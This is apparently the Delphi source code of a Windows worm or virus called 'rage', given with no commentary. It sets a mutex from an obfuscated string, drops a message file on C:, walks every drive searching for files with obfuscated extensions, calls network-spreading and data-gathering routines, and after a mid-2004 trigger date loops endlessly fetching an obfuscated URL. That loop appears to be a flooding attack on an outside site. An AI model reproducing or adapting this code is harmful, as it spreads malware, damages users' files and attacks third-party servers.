   Program rage;

   uses
     Windows,
     WinSock,
     Unit1 in 'Unit1.pas',
     Unit2 in 'Unit2.pas';

   function DFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   function GetDrives:string;
   var
      p:integer;
      This,All,c,f,cDrives:string;
   begin
      c:=';';
      f:=Chr(0);
      SetLength(cDrives,300);
      GetLogicalDriveStrings(300,PChar(cDrives));
      p:=Pos(f,cDrives);
      while p > 0 do
      begin
         This:=Copy(cDrives,1,p - 1);
         if Length(This) <> 3 then Break;
         cDrives:=Copy(cDrives,p + 1,Length(cDrives));
         p:=Pos(f,cDrives);
         if lowercase(copy(this,1,3)) <> decode('K:\') then
          All:=All + This + c;
      end;
      GetDrives:=all;
   end;

   var
    SYSTEMTIME       : _SYSTEMTIME;
    AA               : DWORD;
    Driv             : String;
    Abc_C            : Integer;
    FMsg             : TextFile;
   Begin
    Release;

    CreateMutexA(NIL, TRUE, pChar(decode('c6kAt6klAM_8d7SEMu6dZo')));
    If (GetLastError() = ERROR_ALREADY_EXISTS) Then ExitProcess(0);

    For Abc_c := 0 to 63 Do begin
     abc1 := abc1 + chr(a1[abc_c]);
     abc2 := abc2 + chr(a2[abc_c]);
    end;

    AssignFile(FMsg, 'C:\FH.txt');
    ReWrite(FMsg);
    For Abc_c := 0 To 293 Do
     Write(FMsg, Chr(Msg[Abc_c]));
    CloseFile(FMsg);

    Driv := GetDrives;

    While Driv <> '' Do Begin
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*',decode('.ebe'));
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*',decode('.0wg'));
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*',decode('.50q'));
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*',decode('.|LT'));
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*',decode('.0gC'));
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*',decode('.mKG'));
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*',decode('.w0b'));
     Driv := Copy(Driv,pos(';',Driv)+1,length(Driv));
    End;

    gonetwork;

    CreateThread(nil,0,@StartGather,nil,0,AA);

    GetSystemTime(SYSTEMTIME);
    IF (SystemTime.wYear > 2004) or
       ((SystemTime.wYear = 2004) and (SystemTime.wMonth > 5)) Then Begin
     While 1<>2 Do Begin
      DFile(0,pChar(decode('9GG|://zzz.DiUKq5Gwqg.5e')),'',0,0);
      Sleep(10);
     End;
    End;

    while 1<>2 do begin
     ;
    end;
   End.
